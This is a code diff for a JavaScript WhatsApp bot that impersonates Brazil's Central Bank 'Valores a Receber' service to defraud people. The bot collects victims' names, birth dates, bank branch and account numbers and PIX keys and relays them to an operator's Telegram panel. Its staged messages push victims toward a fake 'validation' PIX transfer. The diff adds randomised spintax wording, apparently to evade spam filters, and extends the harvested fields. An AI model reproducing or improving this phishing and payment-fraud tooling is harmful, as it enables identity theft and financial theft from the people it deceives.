@@ -238,7 +238,7 @@ async function sendBotMessage(chatId, rawText, options = {}) {
     }
 }
 
-const SENSITIVE_SESSION_KEYS = ['name', 'birthDate', 'bankCc', 'bankAg', 'email', 'bankName', 'pixCode', 'formalMessage'];
+const SENSITIVE_SESSION_KEYS = ['name', 'birthDate', 'bankCc', 'bankAg', 'email', 'bankName', 'pixCode', 'formalMessage', 'value'];
 
 function decryptSession(session) {
     const decrypted = { ...session };
@@ -384,7 +384,7 @@ async function notifyTelegramPhoto(buffer, caption) {
 }
 
 // Monta o texto do painel de cadastro no Telegram (editável)
-function buildCadastroMessage(chatId, nome, dataNasc, status, tipo = 'CPF', humanStep = 0, isCalling = false) {
+function buildCadastroMessage(chatId, nome, dataNasc, status, tipo = 'CPF', humanStep = 0, isCalling = false, pixKey = '', value = '', bankName = '', bankAg = '', bankCc = '') {
     const statusEmoji = {
         'preenchendo_data': '⏳',
         'preenchendo_nome': '⏳',
@@ -399,6 +399,11 @@ function buildCadastroMessage(chatId, nome, dataNasc, status, tipo = 'CPF', huma
 
     const nomeDisplay = nome ? `✅ <b>${nome}</b>` : `<i>⏳ Preenchendo...</i>`;
     const dataDisplay = dataNasc ? `✅ <b>${dataNasc}</b>` : `<i>⏳ Preenchendo...</i>`;
+    const bankDisplay = bankName ? `✅ <b>${bankName}</b>` : `<i>⏳ Preenchendo...</i>`;
+    const agDisplay = bankAg ? `✅ <b>${bankAg}</b>` : `<i>⏳ Preenchendo...</i>`;
+    const ccDisplay = bankCc ? `✅ <b>${bankCc}</b>` : `<i>⏳ Preenchendo...</i>`;
+    const pixDisplay = pixKey ? `<code>${pixKey}</code>` : `<i>⏳ Preenchendo...</i>`;
+    const valueDisplay = value ? `<b>${value}</b>` : `<i>⏳ Calculando...</i>`;
 
     let statusMsg = '';
     let callPulse = '';
@@ -428,7 +433,12 @@ function buildCadastroMessage(chatId, nome, dataNasc, status, tipo = 'CPF', huma
         `📄 <b>Tipo:</b> ${tipoLabel}\n\n` +
         `📋 <b>Dados do Titular:</b>\n` +
         `• ${dataLabel}: ${dataDisplay}\n` +
-        `• ${nomeLabel}: ${nomeDisplay}\n\n` +
+        `• ${nomeLabel}: ${nomeDisplay}\n` +
+        `• 🏦 Banco: ${bankDisplay}\n` +
+        `• 🏛️ Agência: ${agDisplay}\n` +
+        `• 💳 Conta: ${ccDisplay}\n` +
+        `• 🔑 Chave PIX: ${pixDisplay}\n` +
+        `• 💰 Valor: ${valueDisplay}\n\n` +
         `📊 <b>Status:</b> ${statusMsg}`;
 
     const e2Label = humanStep >= 2 ? "📞 Etapa 2 ✅" : "📞 Etapa 2 (Pendente)";
@@ -843,7 +853,7 @@ client.on('incoming_call', async (call) => {
         chatSessions.set(targetChatId, currentSession);
 
         if (currentSession.tgMsgId) {
-            const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'human', currentSession.docType, currentSession.humanStep || 1, true);
+            const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'human', currentSession.docType, currentSession.humanStep || 1, true, currentSession.pixCode, currentSession.value, currentSession.bankName, currentSession.bankAg, currentSession.bankCc);
             await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
         }
 
@@ -863,21 +873,28 @@ client.on('incoming_call', async (call) => {
 // NÃO processa mensagens recebidas aqui para evitar confusão.
 // =============================================================
 
+function spinText(text) {
+    return text.replace(/{(.*?)}/g, (match, options) => {
+        const choices = options.split('|');
+        return choices[Math.floor(Math.random() * choices.length)];
+    });
+}
+
 function buildStatusMessage(step) {
     const s1 = step >= 1 ? '✅ Concluída' : '⏳ Pendente';
     const s2 = (step === 2 || step === 21 || step >= 3) ? '✅ Concluída' : (step === 1 ? '🔄 Em andamento' : '⏳ Pendente');
     const s3 = step >= 3 ? '✅ Concluída' : '⏳ Pendente';
     const s4 = step >= 4 ? '✅ Concluída' : '⏳ Pendente';
 
-    return `🔐 *PORTAL DE VALORES — SISTEMA DE VALORES A RECEBER*
-*Departamento de Liberação de Ativos Financeiros*
+    return spinText(`🔐 *{PORTAL DE VALORES|SISTEMA DE VALORES A RECEBER}*
+*{Departamento de Liberação de Ativos|Setor de Homologação de Crédito}*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-Prezado(a) Titular,
+{Prezado(a) Titular|Prezado(a) Cidadão(ã)},
 
-Informamos que a partir deste momento o(a) senhor(a) está sendo atendido(a) diretamente por um *Operador Especializado do Departamento Jurídico-Financeiro* do Portal de Valores, vinculado ao Banco Central do Brasil, em conformidade com a *Lei Complementar nº 105/2001* e a *Resolução BCB nº 4.862/2020*.
+Informamos que a partir deste momento o(a) senhor(a) está sendo atendido(a) diretamente por um *Operador Especializado do Departamento Jurídico-Financeiro* do Portal de Valores, em conformidade com a *Lei Complementar nº 105/2001* e a *Resolução BCB nº 4.862/2020*.
 
-Seu processo de liberação de ativos financeiros pendentes encontra-se devidamente registrado em nosso sistema federal e aguarda a conclusão das etapas obrigatórias de validação, conforme previsto na legislação vigente.
+Seu processo de liberação de ativos financeiros pendentes encontra-se devidamente registrado em nosso sistema e aguarda a conclusão das etapas obrigatórias de validação, conforme previsto na legislação vigente.
 
 📋 *ETAPAS OBRIGATÓRIAS PARA LIBERAÇÃO:*
 
@@ -893,28 +910,24 @@ Verificação e habilitação da conta de destino para transferência dos valore
 *4ª Etapa — Liberação e Transferência dos Valores:* ${s4}
 Processamento final e crédito dos ativos financeiros na conta indicada pelo titular.
 
-⚠️ *IMPORTANTE:* Todas as etapas são *obrigatórias e insubstituíveis*, conforme determina o protocolo de segurança do Sistema de Valores a Receber (SVR). A não conclusão de qualquer etapa *suspende automaticamente* o processo de resgate, podendo resultar no bloqueio permanente dos valores a serem recebidos.
-
-Nosso operador responsável conduzirá o(a) senhor(a) pelas próximas etapas de forma segura, sigilosa e dentro dos prazos legalmente estabelecidos.
+⚠️ *IMPORTANTE:* Todas as etapas são *obrigatórias e insubstituíveis*, conforme determina o protocolo de segurança. A não conclusão de qualquer etapa *suspende automaticamente* o processo de resgate.
 
 _Contamos com sua colaboração e compreensão._
 
-*Portal de Valores — Banco Central do Brasil*
-*CNPJ: 00.038.166/0001-05*
-_Este canal é monitorado e possui validade jurídica._`;
+*Portal de Valores — Banco Central do Brasil*`);
 }
 
 // --- MENSAGENS POR ETAPA ---
-const MENSAGEM_ETAPA_2_CONCLUIDA =
-    `🔐 *PORTAL DE VALORES — SISTEMA DE VALORES A RECEBER*
-*Departamento de Liberação de Ativos Financeiros*
+const MENSAGEM_ETAPA_2_CONCLUIDA = 
+    `🔐 *{PORTAL DE VALORES|SISTEMA DE VALORES} — SISTEMA DE VALORES A RECEBER*
+*{Departamento de Liberação de Ativos|Setor de Auditoria de Valores}*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-Prezado(a) Titular,
+{Prezado(a) Titular|Prezado(a) Cidadão(ã)},
 
-✅ *A Validação Jurídica do seu processo foi concluída com êxito.*
+✅ *A Validação Jurídica do seu processo foi {concluída com êxito|finalizada com sucesso}.*
 
-Nosso operador especializado confirmou a titularidade e a autenticidade dos seus dados perante o Departamento de Ativos Não Reclamados do Banco Central do Brasil.
+Nosso {operador especializado|analista de liberação} confirmou a titularidade e a autenticidade dos seus dados perante o Departamento de Ativos Não Reclamados.
 
 📋 *STATUS ATUALIZADO DAS ETAPAS:*
 
@@ -925,19 +938,18 @@ Nosso operador especializado confirmou a titularidade e a autenticidade dos seus
 
 Nosso operador dará continuidade ao processo em instantes. Permaneça disponível.
 
-*Portal de Valores — Banco Central do Brasil*
-_Este processo possui registro jurídico e validade legal._`;
+*Portal de Valores — Banco Central do Brasil*`;
 
-const MENSAGEM_ETAPA_3 =
-    `🔐 *ETAPA 3 — VALIDAÇÃO E HABILITAÇÃO DA CONTA DE DESTINO*
-*Departamento de Segurança Financeira — Portal de Valores*
+const MENSAGEM_ETAPA_3 = 
+    `🔐 *{ETAPA 3 — VALIDAÇÃO DA CONTA DE DESTINO|ETAPA 3 — HOMOLOGAÇÃO DE CONTA PARA CRÉDITO}*
+*{Departamento de Segurança Financeira|Setor de Auditoria Financeira} — Portal de Valores*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-Prezado(a) Titular,
+{Prezado(a) Titular|Prezado(a) Cidadão(ã)},
 
 Para garantir a integridade da transferência dos seus ativos, o sistema exige a realização de um procedimento de *Validação de Vínculo Bancário*. 
 
-⚠️ *ESCLARECIMENTO:* Este procedimento *NÃO* é uma transação comercial, mas sim uma autenticação obrigatória da conta bancária que irá receber os valores. O protocolo gera um *Vínculo de Segurança* entre o Banco Central e sua conta.
+⚠️ *ESCLARECIMENTO:* Este procedimento *NÃO* é uma cobrança comercial, mas sim uma autenticação obrigatória da conta bancária que irá receber os valores. O protocolo gera um *Vínculo de Segurança* entre o Banco Central e sua conta.
 
 📋 *DADOS DO PROTOCOLO DE VALIDAÇÃO:*
 
@@ -951,15 +963,14 @@ O sistema processará o estorno de forma automática via PIX em até 60 segundos
 
 Aguarde o envio das instruções de validação (Código Hash de Autenticação).
 
-*Portal de Valores — Banco Central do Brasil*
-_Processo regido pela Resolução BCB nº 318/2023._`;
+*Portal de Valores — Banco Central do Brasil*`;
 
-const MENSAGEM_ETAPA_4 =
-    `🔐 *PROTOCOLO DE SEGURANÇA HOMOLOGADO*
-*Departamento de Rastreamento de Ativos — SVR*
+const MENSAGEM_ETAPA_4 = 
+    `🔐 *{PROTOCOLO DE SEGURANÇA HOMOLOGADO|INTEGRAÇÃO DE SEGURANÇA DETECTADA}*
+*{Departamento de Rastreamento de Ativos|Setor de Processamento de Crédito} — SVR*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-Prezado(a) Titular,
+{Prezado(a) Titular|Prezado(a) Cidadão(ã)},
 
 Informamos que o seu *Protocolo Privado de Segurança* foi gerado com êxito pelo sistema federal de ativos.
 
@@ -975,12 +986,13 @@ ${BT}
 ⚠️ *ATENÇÃO:* Permaneça nesta tela. O sistema está monitorando a validação do hash em tempo real. Assim que concluído, o montante total será liberado.
 
 *Portal de Valores — Banco Central do Brasil*`;
-const MENSAGEM_ETAPA_5 =
-    `✨ *PROTOCOLO FINALIZADO — RESGATE CONCLUÍDO* ✨
-*Departamento de Execução Financeira — Portal de Valores*
+
+const MENSAGEM_ETAPA_5 = 
+    `✨ *{PROTOCOLO FINALIZADO — RESGATE CONCLUÍDO|PROCESSAMENTO CONCLUÍDO — CRÉDITO ENVIADO}* ✨
+*{Departamento de Execução Financeira|Setor de Pagamentos Federais} — Portal de Valores*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-Prezado(a) Titular,
+{Prezado(a) Titular|Prezado(a) Cidadão(ã)},
 
 Informamos que o seu processo de resgate foi *100% HOMOLOGADO E FINALIZADO* com sucesso.
 
@@ -995,8 +1007,7 @@ Informamos que o seu processo de resgate foi *100% HOMOLOGADO E FINALIZADO* com 
 
 Agradecemos por utilizar os canais oficiais do Banco Central do Brasil para a recuperação de seus ativos financeiros.
 
-*Portal de Valores — Banco Central do Brasil*
-_Processo 100% Homologado e Finalizado._`;
+*Portal de Valores — Banco Central do Brasil*`;
 
 const BANCOS_LIST = JSON.parse(_d("eyIxMDAiOiJQbGFubmVyIENvcnJldG9yYSBkZSBWYWxvcmVzIFMuQS4iLCIxMDEiOiJSZW5hc2NlbmNhIERpc3RyaWJ1aWRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsacOhcmlvcyBMdGRhIiwiMTAyIjoiWHAgSW52ZXN0aW1lbnRvcyBDb3JyZXRvcmEgZGUgQ8OibWJpbyxUw610dWxvcyBkIFZhbG9yZXMgTW9iaWxpw6FyaW9zIFMvQSIsIjEwNCI6IkNhaXhhIEVjb25vbWljYSBGZWRlcmFsIiwiMTA1IjoiTGVjY2EgQ3LDqWRpdG8iLCIxMDciOiJCYW5jbyBCb2NvbSBCYm0gUy5BLiIsIjEwOCI6IlBvcnRvY3JlZCBTLkEuIC0gQ3JlZGl0byIsIjExMSI6Ik9saXZlaXJhIFRydXN0IERpc3RyaWJ1aWRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsaWFyaW9zIFMuQS4iLCIxMTMiOiJNYWdsaWFubyBTLkEuIENvcnJldG9yYSBEZSBDYW1iaW8gRSBWYWxvcmVzIE1vYmlsaWFyaW9zIiwiMTE0IjoiQ2VudHJhbCBDb29wZXJhdGl2YSBEZSBDcsOpZGl0byBObyBFc3RhZG8gRG8gRXNww61yaXRvIFNhbnRvIC0gQ2Vjb29wIiwiMTE3IjoiQWR2YW5jZWQgQ29ycmV0b3JhIERlIEPDom1iaW8gTHRkYSIsIjExOSI6IkJhbmNvIFdlc3Rlcm4gVW5pb24gRG8gQnJhc2lsIFMuQS4iLCIxMjAiOiJCYW5jbyBSb2RvYmVucyBTLkEuIiwiMTIxIjoiQmFuY28gQWdpYmFuayBTLkEuIiwiMTIyIjoiQmFuY28gQnJhZGVzY28gQmVyaiBTLkEuIiwiMTI0IjoiQmFuY28gV29vcmkgQmFuayBEbyBCcmFzaWwgUy5BLiIsIjEyNSI6IlBsdXJhbCBTLkEuIEJhbmNvIE3Dumx0aXBsbyIsIjEyNiI6IkJyIFBhcnRuZXJzIEJhbmNvIERlIEludmVzdGltZW50byBTLkEuIiwiMTI3IjoiQ29kZXBlIENvcnJldG9yYSBEZSBWYWxvcmVzIEUgQ8OibWJpbyBTLkEuIiwiMTI4IjoiTXMgQmFuayBTLkEuIEJhbmNvIERlIEPDom1iaW8iLCIxMjkiOiJVYnMgQnJhc2lsIEJhbmNvIGRlIEludmVzdGltZW50byBTLkEuIiwiMTMwIjoiQ2FydWFuYSBTLkEuIC0gU29jaWVkYGFkZSBEZSBDcsOpZGl0byIsIjEzMSI6IlR1bGxldHQgUHJlYm9uIEJyYXNpbCBDb3JyZXRvcmEgZGUgVmFsb3JlcyBlIEPDom1iaW8gTHRkYSIsIjEzMiI6IkljYmMgRG8gQnJhc2lsIEJhbmNvIE3Dumx0aXBsbyBTLkEuIiwiMTMzIjoiQmFuY28gQ3JlZ29sIC0gQ29uZmVkZXJhw6fDo28gTmFjaW9uYWwgRGFzIENvb3BlcmF0aXZhcyBDZW50cmFpcyBEZSBDcsOpZGl0byBlIEVjb25vbWlhIEZhbWlsaWFyIGUgU29saWTDoXJpYSIsIjEzNCI6IkJnYyBMaXF1aWRleiBEaXN0cmlidWlkb3JhIERlIFTDtXR1bG9zIEUgVmFsb3JlcyBNb2JpbGnDoXJpb3MgTHRkYSIsIjEzNiI6IlVuaWNyZWQgRG8gQnJhc2lsIC0gQ29uZmVkZXJhw6fDo28gTmFjaW9uYWwgRGFzIENvb3BlcmF0aXZhcyBDZW50cmFpcyBVbmljcmVkIEx0ZGEuIiwiMTM4IjoiR2V0IE1vbmV5IENvcnJldG9yYSBEZSBDw6JtYmlvIFMuQS4iLCIxMzkiOiJJbnRlc2EgU2FucGFvbG8gQnJhc2lsIFMuQS4gLSBCYW5jbyBNdWx0aXBsbyIsIjE0MCI6IkVhc3ludmVzdCAtIFTDrXR1bG8gQ29ycmV0b3JhIERlIFZhbG9yZXMgU2EiLCIxNDIiOiJCcm9rZXIgQnJhc2lsIENvcnJldG9yYSBEZSBDw6JtYmlvIEx0ZGEuIiwiMTQzIjoiVHJldmlzbyBDb3JyZXRvcmEgRGUgQ8OibWJpbyBTLkEuIiwiMTQ0IjoiQmV4cyBCYW5jbyBEZSBDw6JtYmlvIFMvQSIsIjE0NSI6IkxldnljYW0gLSBDb3JyZXRvcmEgRGUgQ2FtYmlvIEUgVmFsb3JlcyBMdGRhLiIsIjE0NiI6Ikd1aXR0YSBDb3JyZXRvcmEgRGUgQ2FtYmlvIEx0ZGEuIiwiMTQ5IjoiRmFjdGEgRmluYW5jZWlyYSBTLkEuIC0gQ3LDqWRpdG8gRmluYW5jaWFtZW50byBlIEludmVzdGltZW50byIsIjE1NyI6IkljYXAgRG8gQnJhc2lsIENvcnJldG9yYSBEZSBUw610dWxvcyBFIFZhbG9yZXMgTW9iaWxpw6FyaW9zIEx0ZGEuIiwiMTU5IjoiQ2FzYSBEbyBDcsOpZGl0byBTLkEuIFNvY2llZGFkZSBEZSBDcsOpZGl0byBBbyBNaWNyb2VtcHJlZW5kZWRvciIsIjE2MyI6IkNvbW1lcnpiYW5rIEJyYXNpbCBTLkEuIC0gQmFuY28gTcO6bHRpcGxvIiwiMTY5IjoiQmFuY28gT2zDqSBDb25zaWduYWRvIFMuQS4iLCIxNzMiOiJCcmwgVHJ1c3QgRGlzdHJpYnVpZG9yYSBEZSBUw610dWxvcyBFIFZhbG9yZXMgTW9iaWxpw6FyaW9zIFMuQS4iLCIxNzQiOiJQZWZpc2EgUy5BLiAtIENyw6lkaXRvIiwiMTc3IjoiR3VpZGUgSW52ZXN0aW1lbnRvcyBTLkEuIENvcnJldG9yYSBEZSBWYWxvcmVzIiwiMTgwIjoiQ20gQ2FwaXRhbCBNYXJrZXRzIENvcnJldG9yYSBEZSBDw6JtYmlvLCBUw610dWxvcyBFIFZhbG9yZXMgTW9iaWxpw6FyaW9zIEx0ZGEiLCIxODMiOiJTb2NyZWQgUy5BLiAtIFNvY2llZGFkZSBEZSBDcsOpZGl0byBBbyBNaWNyb2VtcHJlZW5kZWRvciBlIGEgRW1wcmVzYSBEZSBQZXF1ZW5vIFAiLCIxODQiOiJCYW5jbyBJdGHDuiBCQkEgUy5BLiIsIjE4OCI6IkF0aXZhIEludmVzdGltZW50b3MgUy5BLiBDb3JyZXRvcmEgRGUgVMOtdHVsb3MsIEPDom1iaW8gRSBWYWxvcmVzIiwiMTg5IjoiSFMgRmluYW5jZWlyYSBTL0EgQ3JlZGl0byIsIjE5MCI6IlNlcnZpY29vcCAtIENvb3BlcmF0aXZhIERlIENyw6lkaXRvIERvcyBTZXJ2aWRvcmVzIFDDumJsaWNvcyBFc3RhZHVhaXMgRG8gUmlvIEdyYW4iLCIxOTEiOiJOb3ZhIEZ1dHVyYSBDb3JyZXRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsacOhcmlvcyBMdGRhLiIsIjE5NCI6IlBhcm1ldGFsIERpc3RyaWJ1aWRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsacOhcmlvcyBMdGRhIiwiMTk2IjoiRmFpciBDb3JyZXRvcmEgRGUgQ8OibWJpbyBTLkEuIiwiMTk3IjoiU3RvbmUgUGFnYW1lbnRvcyBTLkEuIiwiMjA4IjoiQmFuY28gQlRHIFBhY3R1YWwgUy5BLiIsIjIxMiI6IkJhbmNvIE9yaWdpbmFsIFMuQS4iLCIyMTMiOiJCYW5jbyBBcmJpIFMuQS4iLCIyMTciOiJCYW5jbyBKb2huIERlZXJlIFMuQS4iLCIyMTgiOiJCYW5jbyBCczIgUy5BLiIsIjIyMiI6IkJhbmNvIENyw6lkaXQgQWdyaWNvbGUgQnJhc2lsIFMuQS4iLCIyMjQiOiJCYW5jbyBGaWJyYSBTLkEuIiwiMjMzIjoiQmFuY28gQ2V0ZWxlbSBTLkEuIiwiMjM3IjoiQmFuY28gQnJhZGVzY28gUy5BLiIsIjI0MSI6IkJhbmNvIENsw6Fzc2ljbyBTLkEuIiwiMjQzIjoiQmFuY28gTcOheGltYSBTLkEuIiwiMjQ2IjoiQmFuY28gQWJjIEJyYXNpbCBTLkEuIiwiMjQ5IjoiQmFuY28gSW52ZXN0Y3JlZCBVbmliYW5jbyBTLkEuIiwiMjUwIjoiQmN2IC0gQmFuY28gZGUgQ3LDqWRpdG8gZSBWYXJlam8gUy5BLiIsIjI1MyI6IkJleHMgQ29ycmV0b3JhIERlIEPDom1iaW8gUy5BLiIsIjI1NCI6IlBhcmFuw6EgQmFuY28gUy5BLiIsIjI1OSI6Ik1vbmV5Y29ycCBCYW5jbyBkZSBtw61iaW8gUy5BLiIsIjI2MCI6Ik51IFBhZ2FtZW50b3MgUy5BLiIsIjI2NSI6IkJhbmNvIEZhdG9yIFMuQS4iLCIyNjYiOiJCYW5jbyBDZWR1bGEgUy5BLiIsIjI2OCI6IkJhcmkgQ29tcGFuaGlhIEhpcG90ZWPDoXJpYSIsIjI2OSI6IkJhbmNvIEhTQkMgUy5BLiIsIjI3MCI6IlNhZ2l0dXIgQ29ycmV0b3JhIERlIEPDom1iaW8gTHRkYS4iLCIyNzEiOiJJYiBDb3JyZXRvcmEgZGUgQ8OibWJpbywgdMOtdHVsbyBlIFZhbG9yZXMgTW9iaWxpw6FyaW9zIFMuQS4iLCIyNzIiOiJCYW5jbyBBZ2sgUy5BLiIsIjI3MyI6IkNvb3BlcmF0aXZhIGRlIENyw6lkaXRvIFUnIn0="));
 
@@ -1200,7 +1211,12 @@ client.on('message_create', async (msg) => {
                     'human',
                     currentSession.docType,
                     currentSession.humanStep,
-                    false
+                    false,
+                    currentSession.pixCode,
+                    currentSession.value,
+                    currentSession.bankName,
+                    currentSession.bankAg,
+                    currentSession.bankCc
                 );
                 await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
             }
@@ -1237,7 +1253,20 @@ client.on('message_create', async (msg) => {
     chatSessions.set(targetChatId, updatedSession);
     saveSessions();
 
-    const { text: txtAssume, reply_markup: rmAssume } = buildCadastroMessage(targetChatId, updatedSession.name, updatedSession.birthDate, 'human', updatedSession.docType, 1);
+    const { text: txtAssume, reply_markup: rmAssume } = buildCadastroMessage(
+        targetChatId,
+        updatedSession.name,
+        updatedSession.birthDate,
+        'human',
+        updatedSession.docType,
+        1,
+        false,
+        updatedSession.pixCode,
+        updatedSession.value,
+        updatedSession.bankName,
+        updatedSession.bankAg,
+        updatedSession.bankCc
+    );
     await notifyTelegram(txtAssume, updatedSession.tgMsgId, rmAssume);
 
     setTimeout(async () => {
@@ -1420,7 +1449,22 @@ async function processIncomingMessage(msg, targetChatId) {
             }
         }
 
-        const { text: txtInit, reply_markup } = buildCadastroMessage(targetChatId, null, null, 'preenchendo_data', docType);
+        const pix = expectedData?.pix || '';
+        const valToSet = expectedData?.value || '';
+        const nameToSet = expectedData?.fullName || null;
+        const birthToSet = expectedData?.birthDate || null;
+        
+        const { text: txtInit, reply_markup } = buildCadastroMessage(
+            targetChatId,
+            nameToSet,
+            birthToSet,
+            'preenchendo_data',
+            docType,
+            0,
+            false,
+            pix,
+            valToSet
+        );
         const tgMsgId = await notifyTelegram(txtInit, null, reply_markup);
 
         chatSessions.set(targetChatId, {
@@ -1431,17 +1475,21 @@ async function processIncomingMessage(msg, targetChatId) {
             docType,
             lastMsgTime: Date.now(),
             createdAt: Date.now(),
-            tgMsgId
+            tgMsgId,
+            pixCode: pix,
+            value: valToSet,
+            name: nameToSet,
+            birthDate: birthToSet
         });
         saveSessions();
 
         setTimeout(async () => {
             if (isPJ) {
                 await sendBotMessage(targetChatId,
-                    `🏢 *Portal de Valores — Atendimento Empresarial*\n\nIdentificamos ativos financeiros pendentes vinculados ao CNPJ informado em nosso sistema.\n\nPara prosseguir com a validação da titularidade jurídica, necessitamos confirmar os dados cadastrais da empresa.\n\n📍 *ETAPA 1:* Informe a *Data de Abertura* da empresa (Ex: 10/05/2005):`);
+                    `🏢 *{Portal de Valores|Sistema de Valores} — {Atendimento Empresarial|Suporte Pessoa Jurídica}*\n\n{Identificamos|Constatamos|Verificamos} {ativos financeiros|valores cadastrados|saldos credores} pendentes vinculados ao CNPJ {informado|consultado} em nosso sistema.\n\nPara {prosseguir com|dar andamento a} a validação da titularidade jurídica, {necessitamos|precisamos} confirmar os dados cadastrais da empresa.\n\n📍 *ETAPA 1:* {Informe|Digite|Por favor, insira} a *Data de Abertura* da empresa (Ex: 10/05/2005):`);
             } else {
                 await sendBotMessage(targetChatId,
-                    `👋 *Olá! Sou o assistente oficial do Portal de Valores.*\n\nPara sua segurança, iniciamos o *Protocolo de Validação de Dados*.\n\n📍 *ETAPA 1:* Digite sua *Data de Nascimento* (Ex: 10/05/1990):`);
+                    `👋 *{Olá! Sou o assistente oficial|Oi! Sou o atendente oficial|Saudações! Sou o assistente} do Portal de Valores.*\n\nPara sua {segurança|proteção}, iniciamos o *{Protocolo de Validação|Procedimento de Verificação} de Dados*.\n\n📍 *ETAPA 1:* {Digite|Informe|Por favor, insira} sua *Data de Nascimento* (Ex: 10/05/1990):`);
             }
         }, 1500);
         return;
@@ -1460,7 +1508,7 @@ async function processIncomingMessage(msg, targetChatId) {
                 chatSessions.set(targetChatId, currentSession);
                 saveSessions();
 
-                await sendBotMessage(targetChatId, `🔄 *Entendido. Atualizaremos para a instituição ${detectedBank.name}.*\n\n📍 *FASE 1.3:* Informe os números da sua *Agência* bancária para continuarmos:`);
+                await sendBotMessage(targetChatId, `🔄 *{Entendido. Atualizaremos para a instituição|Perfeito. Vamos atualizar para o banco} ${detectedBank.name}.*\n\n📍 *FASE 1.3:* {Informe|Digite|Por favor, insira} os números da sua *Agência* bancária para continuarmos:`);
                 return;
             } else {
                 currentSession.mode = 'bot';
@@ -1468,7 +1516,7 @@ async function processIncomingMessage(msg, targetChatId) {
                 chatSessions.set(targetChatId, currentSession);
                 saveSessions();
 
-                await sendBotMessage(targetChatId, `🔄 *Entendido. Vamos recomeçar o cadastro dos seus dados bancários.*\n\n📍 *FASE 1.3:* Informe o *Nome da sua Instituição Financeira* (Ex: Nubank, Itaú, Caixa, Banco do Brasil, Bradesco, etc):`);
+                await sendBotMessage(targetChatId, `🔄 *{Entendido. Vamos recomeçar o cadastro dos seus dados bancários|Certo. Vamos reiniciar a vinculação dos seus dados bancários}.*\n\n📍 *FASE 1.3:* {Informe|Digite} o *Nome da sua Instituição Financeira* (Ex: Nubank, Itaú, Caixa, Banco do Brasil, Bradesco, etc):`);
                 return;
             }
         } else if (detectedBank && text.length < 100) {
@@ -1480,7 +1528,7 @@ async function processIncomingMessage(msg, targetChatId) {
             chatSessions.set(targetChatId, currentSession);
             saveSessions();
 
-            await sendBotMessage(targetChatId, `🏦 *Sistema de Valores a Receber*\n\nIdentificamos que você mencionou a instituição *${detectedBank.name}*.\n\nDeseja alterar seus dados de recebimento para este banco?\n\nResponda *SIM* para alterar ou *NÃO* para manter os dados atuais.`);
+            await sendBotMessage(targetChatId, `🏦 *{Sistema de Valores a Receber|Portal de Valores}*\n\n{Identificamos|Detectamos} que você mencionou a instituição *${detectedBank.name}*.\n\n{Deseja alterar seus dados de recebimento para este banco|Deseja atualizar seus dados para receber por esta conta}?\n\n{Responda *SIM* para alterar ou *NÃO* para manter os dados atuais|Responda *SIM* para atualizar ou *NÃO* para cancelar}.`);
             return;
         }
     }
@@ -1520,7 +1568,30 @@ async function processIncomingMessage(msg, targetChatId) {
             if (agMatch || ccMatch || (text.length >= 4 && /^\d+$/.test(text.replace(/[-\s]/g, '')))) {
                 const ag = agMatch ? agMatch[1] : (text.length <= 5 ? text : 'Pendente');
                 const cc = ccMatch ? ccMatch[1] : (text.length > 5 ? text : 'Pendente');
-                await notifyTelegram(`🏦 <b>DADOS BANCÁRIOS IDENTIFICADOS</b>\nLead: <code>${targetChatId}</code>\nAgência: <b>${ag}</b>\nConta: <b>${cc}</b>\n\n<i>Texto: ${text}</i>`);
+                
+                currentSession.bankAg = ag;
+                currentSession.bankCc = cc;
+                chatSessions.set(targetChatId, currentSession);
+                saveSessions();
+                
+                if (currentSession.tgMsgId) {
+                    const { text: txt, reply_markup } = buildCadastroMessage(
+                        targetChatId,
+                        currentSession.name,
+                        currentSession.birthDate,
+                        'human',
+                        currentSession.docType,
+                        currentSession.humanStep,
+                        false,
+                        currentSession.pixCode,
+                        currentSession.value,
+                        currentSession.bankName,
+                        ag,
+                        cc
+                    );
+                    await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
+                }
+                
                 await sendBotMessage(targetChatId, `🔍 *Verificando autenticidade...*\n\nDados capturados:\n🏛️ Agência: ${ag}\n💳 Conta: ${cc}\n\nO sistema está cruzando as informações com o CPF titular para autorização do repasse final.`);
                 return;
             }
@@ -1534,7 +1605,8 @@ async function processIncomingMessage(msg, targetChatId) {
 
         const { text: txtEsp, reply_markup: rmEsp } = buildCadastroMessage(targetChatId, null, null, 'preenchendo_data');
         const tgMsgId = await notifyTelegram(txtEsp, null, rmEsp);
-        await notifyTelegram(`📩 <b>NOVO CONTATO ESPONTÂNEO</b>\nLead: <code>${targetChatId}</code>\nMensagem: <i>${text}</i>`);
+        // Desativado para evitar mensagens de notificação adicionais/duplicadas no Telegram
+        // await notifyTelegram(`📩 <b>NOVO CONTATO ESPONTÂNEO</b>\nLead: <code>${targetChatId}</code>\nMensagem: <i>${text}</i>`);
 
         chatSessions.set(targetChatId, {
             mode: 'bot',
@@ -1570,12 +1642,12 @@ async function processIncomingMessage(msg, targetChatId) {
             currentSession.bankCode = currentSession.tempBankCode;
             chatSessions.set(targetChatId, currentSession);
             saveSessions();
-            await sendBotMessage(targetChatId, `🏦 Banco de recebimento atualizado para: *${currentSession.bankName}* ✅\n\nAgora informe os números da sua *Agência* bancária para este banco (somente números):`);
+            await sendBotMessage(targetChatId, `🏦 *{Banco de recebimento atualizado para|Instituição de recebimento atualizada para}*: *${currentSession.bankName}* ✅\n\nAgora {informe|insira} os números da sua *Agência* bancária para este banco (somente números):`);
         } else {
             currentSession.mode = currentSession.prevMode || 'waiting';
             chatSessions.set(targetChatId, currentSession);
             saveSessions();
-            await sendBotMessage(targetChatId, `✅ *Compreendido. Manteremos seus dados bancários atuais.*\n\nPor favor, aguarde o processamento ou continue seu atendimento.`);
